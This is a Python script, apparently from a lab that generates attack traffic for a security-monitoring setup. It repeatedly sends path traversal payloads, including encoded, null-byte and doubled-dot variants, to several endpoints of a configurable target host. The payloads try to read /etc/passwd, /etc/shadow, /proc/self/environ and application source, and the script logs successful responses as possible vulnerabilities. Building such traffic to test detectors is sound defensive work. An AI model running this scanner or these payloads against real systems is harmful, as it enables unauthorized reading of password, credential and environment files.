import requests
import time
import logging
import os
from pathlib import Path
import sys
sys.path.append('/attack/common')
from event_sender import send_security_event

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TARGET_HOST = os.getenv('TARGET_HOST', 'target_proxy')
TARGET_PORT = os.getenv('TARGET_PORT', '80')
TARGET_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

ENDPOINTS = ["/", "/monitoring", "/security"]
TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd%00",
    "../../../etc/shadow",
    "../../app/app.py",
    "../../../proc/self/environ"
]

def perform_path_traversal():
    while True:
        for endpoint in ENDPOINTS:
            for payload in TRAVERSAL_PAYLOADS:
                try:
                    params = {"file": payload, "path": payload}
                    response = requests.get(
                        f"{TARGET_URL}{endpoint}",
                        params=params,
                        allow_redirects=False
                    )
                    logger.info(f"Path Traversal attempt on {endpoint} with payload {payload}: {response.status_code}")
                    
                    # Отправляем событие безопасности
                    send_security_event('Path', response.request.headers.get('X-Real-IP', 'unknown'),
                                     f"Endpoint: {endpoint}, Payload: {payload}")
                    
                    if response.status_code == 200:
                        logger.warning(f"Potential vulnerability found with payload: {payload}")
                        logger.warning(f"Response length: {len(response.text)}")
                except Exception as e:
                    logger.error(f"Error during Path Traversal attack: {e}")
                time.sleep(5)

if __name__ == "__main__":
    logger.info("Starting Path Traversal attacks...")
    perform_path_traversal() 